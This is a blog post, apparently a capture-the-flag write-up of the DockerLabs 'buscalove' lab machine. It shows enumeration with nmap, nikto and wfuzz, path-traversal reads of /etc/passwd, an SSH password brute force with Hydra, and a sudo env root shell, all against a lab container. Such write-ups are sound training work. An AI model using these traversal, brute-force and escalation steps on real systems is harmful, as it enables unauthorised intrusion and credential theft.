---
layout: post
title: "buscalove - dockerlabs"
date: 2024-10-27 06:25:00 -0400
categories:
    - posts
tags:
    - Road2OSCP
    - CTF
    - en
    - writeup
---


# buscalove [dockerlabs]

# enumeration

```bash
┌──(root㉿kali)-[~/maquinas/buscalove/nmap]
└─# cat targeted      
# Nmap 7.94SVN scan initiated Sat Nov  2 08:48:00 2024 as: nmap -sCV -p22,80 -oN targeted 172.18.0.2
Nmap scan report for 172.18.0.2
Host is up (0.000022s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 dc:4c:b6:41:c4:e1:72:c3:7d:a0:ed:ca:0e:7a:bc:54 (ECDSA)
|_  256 66:61:de:8c:fb:5b:3b:f4:fb:b9:ca:69:b1:ac:6e:2e (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:42:AC:12:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov  2 08:48:07 2024 -- 1 IP address (1 host up) scanned in 6.60 seconds

┌──(root㉿kali)-[~/maquinas/buscalove/nmap]
└─# dirsearch  -u http://$target
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                                                             
                                                                                                                                                    
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/maquinas/buscalove/nmap/reports/http_172.18.0.2/_24-11-02_17-29-13.txt

Target: http://172.18.0.2/

[17:29:13] Starting:                                                                                                                                
[17:29:14] 403 -  275B  - /.ht_wsr.txt                                      
[17:29:14] 403 -  275B  - /.htaccess.bak1                                   
[17:29:14] 403 -  275B  - /.htaccess.orig                                   
[17:29:14] 403 -  275B  - /.htaccess.sample
[17:29:14] 403 -  275B  - /.htaccess.save
[17:29:14] 403 -  275B  - /.htaccess_extra                                  
[17:29:14] 403 -  275B  - /.htaccessBAK
[17:29:14] 403 -  275B  - /.htaccess_orig
[17:29:14] 403 -  275B  - /.htaccess_sc
[17:29:14] 403 -  275B  - /.htaccessOLD
[17:29:14] 403 -  275B  - /.htm                                             
[17:29:14] 403 -  275B  - /.html
[17:29:14] 403 -  275B  - /.htaccessOLD2                                    
[17:29:14] 403 -  275B  - /.htpasswd_test                                   
[17:29:14] 403 -  275B  - /.htpasswds
[17:29:14] 403 -  275B  - /.httr-oauth                                      
[17:29:14] 403 -  275B  - /.php                                             
[17:29:31] 403 -  275B  - /server-status                                    
[17:29:31] 403 -  275B  - /server-status/                                                                                                           
[17:29:36] 200 -  553B  - /wordpress/                                                                                                               
                                                                                                                                                    
Task Completed  

┌──(root㉿kali)-[~/maquinas/buscalove/nmap]
└─# nikto -h http://$target/wordpress -Tuning 5 -Display V | grep -v 404 | grep -v 400
- Nikto v2.5.0
 [..]
 V:Sat Nov  2 17:35:55 2024 - Running scan for "Nikto Tests" plugin

V:Sat Nov  2 17:35:56 2024 - 200 for GET:       /wordpress/index.php?download=/winnt/win.ini
V:Sat Nov  2 17:35:56 2024 - 200 for GET:       /wordpress/index.php?download=/windows/win.ini
V:Sat Nov  2 17:35:56 2024 - 200 for GET:       /wordpress/index.php?download=/etc/passwd
V:Sat Nov  2 17:35:56 2024 - 200 for GET:       /wordpress/index.php?|=../../../../../../../../../etc/passwd
V:Sat Nov  2 17:35:56 2024 - 200 for GET:       /wordpress/index.php?page=../../../../../../../../../../etc/passwd
V:Sat Nov  2 17:35:56 2024 - 200 for GET:       /wordpress/index.php?page=../../../../../../../../../../boot.ini
V:Sat Nov  2 17:35:56 2024 - 200 for GET:       /wordpress/index.php?l=forum/view.php&topic=../../../../../../../../../etc/passwd
V:Sat Nov  2 17:35:56 2024 - 200 for GET:       /wordpress/
+ 819 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2024-11-02 17:35:56 (GMT1) (2 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
V:Sat Nov  2 17:35:56 2024 + 819 requests made in 2 seconds

❯ wfuzz -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.18.0.2/wordpress/index.php?FUZZ" --hc 404 --hl 40
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.18.0.2/wordpress/index.php?FUZZ
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                            
=====================================================================

000002045:   500        24 L     90 W       765 Ch      "love"                                                                             
 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 2497
Filtered Requests: 2496
Requests/sec.: 0
         
❯ wfuzz -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://172.18.0.2/wordpress/index.php\?FUZZ\=../../../../../etc/passwd --hc 404 --hl 40
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.18.0.2/wordpress/index.php?FUZZ=../../../../../etc/passwd
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                            
=====================================================================

000002045:   200        66 L     148 W      2319 Ch     "love"      

```

## Conclution

Nikto reveals that there may be LFI (../../etc/passwd).

**Wfuzz to enumerate parameters under index.php: “wfuzz -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.18.0.2/wordpress/index.php?FUZZ" --hc 404 --hl 40”**

- When reading /etc/passwd, we see two users, we run Hydra, and we get the password.
- 

```bash
❯ hydra -t 64 -l rosa -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2 -F -I
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-02 20:12:59
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://172.18.0.2:22/
[STATUS] 333.00 tries/min, 333 tries in 00:01h, 14344099 to do in 717:56h, 31 active
[STATUS] 233.00 tries/min, 699 tries in 00:03h, 14343738 to do in 1026:02h, 26 active

>>>> [22][ssh] host: 172.18.0.2   login: rosa   password: lovebug <<<<<<<<
[STATUS] attack finished for 172.18.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-02 20:16:12
 ~                                                                                                                           ✔  3m 13s 

```

- log via ssh
- 

# Escalation

```bash
rosa@00c69f814360:~$ sudo -l                                                                                                                                                        
Matching Defaults entries for rosa on 00c69f814360:                                                                                                                                 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty                                                      
                                                                                                                                                                                    
User rosa may run the following commands on 00c69f814360:                                                                                                                           
    (ALL) NOPASSWD: /usr/bin/ls, /usr/bin/cat      
    
    
rosa@00c69f814360:~$ sudo cat /root/secret.txt
4E 5A 58 57 43 59 33 46 4F 4A 32 47 43 34 54 42 4F 4E 58 58 47 32 49 4B
    
```

![alt text](https://github.com/nicolasdamians/nicolasdamians.github.io/blob/master/attachments/buscalove/imagen.png?raw=true)


- We tried using that password for the other user we saw, Pedro.
- 

```bash
rosa@00c69f814360:~$ su pedro                                                                                                                                                       
Password:                                                                                                                                                                           
pedro@00c69f814360:/home/rosa$ sudo -l                                                                                                                                              
Matching Defaults entries for pedro on 00c69f814360:                                                                                                                                
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty                                                      

User pedro may run the following commands on 00c69f814360:
    (ALL) NOPASSWD: /usr/bin/env

```

- As Pedro, we see `/usr/bin/env`, gtfobins, and we escalate.
- 

```bash
osa@00c69f814360:~$ su pedro                                                                                                                                                       
Password:                                                                                                                                                                           
pedro@00c69f814360:/home/rosa$ sudo -l                                                                                                                                              
Matching Defaults entries for pedro on 00c69f814360:                                                                                                                                
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty                                                      

User pedro may run the following commands on 00c69f814360:
    (ALL) NOPASSWD: /usr/bin/env
pedro@00c69f814360:/home/rosa$ 

    sudo env /bin/sh

# whoami
root
# 

```

# conclussion lesson learnt

- 
- nikto reveals LFI
- wfuzz is key to enumerate php variables/parameters
- give hydra time, 10 minutes for brute force.
- **Wfuzz to be able to list parameters under index.php “wfuzz -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u ‘[http://172.18.0.2/wordpress/index.php?FUZZ’](http://172.18.0.2/wordpress/index.php?FUZZ%E2%80%99) --hc 404 --hl 40”**
- a common example of parameters under index.php would be:
- `http://tu-sitio.com/index.php?id=123` could load article information with ID 123.
- [http://tu-sitio.com/index.php?accion=editar&id=123](http://tu-sitio.com/index.php?accion=editar&id=123)